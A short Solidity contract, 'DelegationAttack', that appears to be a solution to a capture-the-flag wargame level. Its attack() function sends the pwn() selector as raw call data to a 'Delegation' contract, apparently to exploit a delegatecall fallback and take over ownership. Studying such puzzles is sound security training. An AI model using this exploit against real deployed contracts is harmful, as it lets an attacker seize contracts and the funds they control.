// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Delegation.sol";

contract DelegationAttack {
    Delegation delegation;

    constructor(address _delegationAddress) {
        delegation = Delegation(_delegationAddress);
    }

    function attack() public {
        // Get the function signature of the pwn function
        bytes4 functionSignature = bytes4(keccak256("pwn()"));

        // Call the Delegation contract with the data of the pwn function
        (bool success,) = address(delegation).call(abi.encodeWithSelector(functionSignature));
        require(success, "Attack failed");
    }
}
